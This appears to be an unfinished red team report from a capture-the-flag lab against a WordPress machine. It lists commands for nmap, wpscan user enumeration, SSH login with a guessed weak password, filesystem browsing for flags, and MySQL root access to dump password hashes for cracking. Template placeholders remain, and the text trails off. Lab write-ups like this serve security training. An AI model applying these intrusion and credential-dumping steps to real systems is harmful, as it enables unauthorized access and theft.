# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
_TODO: Fill out the information below._

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap 192.168.1.0/24
```

![Nmap Scan Results](/images/nmap%20192_168_1_0.png)

This scan identifies the services below as potential points of entry:
- Target 1 (192.168.1.110)
  - 22/tcp  open  ssh
  - 80/tcp  open  http
  - 111/tcp open  rpcbind
  - 139/tcp open  netbios-ssn
  - 445/tcp open  microsoft-ds

The following vulnerabilities were identified on each target:
- Target 1
  - Weak Passwords
  - WordPress User Enumeration
  - Port 22 open

![wpscan](

### Exploitation
_TODO: Fill out the details below. Include screenshots where possible._

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
Target 1
- `flag1: b9bbcb33ellb80be759c4e844862482d`
- Exploit to find users:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`


![WP_Scan](/images/03%20wpscan%201.PNG)
- Logging into Target 1 as user Michael
  - Brute force/guessing Michael's password
  - Weak password too easy
  - Password: michael
- Searching directories for Flag 1
  - SSH and directory traversal
  - flag 1 found in /var/www/html folder in root in service.html in a HTML comment at "End of footer area"
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`


![Flag 01](/images/04%20FLAG%2001.PNG)

- `flag2: fc3fd58dcdad9ab23faca6e9a3e581c`
  - Exploit Used
    - `ssh michael@192.168.1.110` 
    - `pw: michael`
    - `cd ../` 
    - `cd ../`
    - `cd var/www`
    - `ls -l`
    - `cat flag2.txt`


![Flag2](images/05%20FLAG%2002.PNG)

- `flag3: afc01ab56b50591e7dccf93122770cd2`
  - Exploit Used
    - SSH and directory traversal
    - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
    - `show databases;`
    - `use wordpress;` 
    - `show tables;`
    - `select * from wp_posts;`


![Flag 03](/images/06%203%20flag.PNG)

- `flag4: 715dea6c055b9fe3337544932f2941ce`
  - Exploit Used
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
      - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
      - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called hashes.
        - Commands:
          - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1`
          - `show databases;`
          - `use wordpress;`
          - `show tables;`
          - `select * from wp_users;`

![wp_users](/images/08%20wp%20users.png)
- d
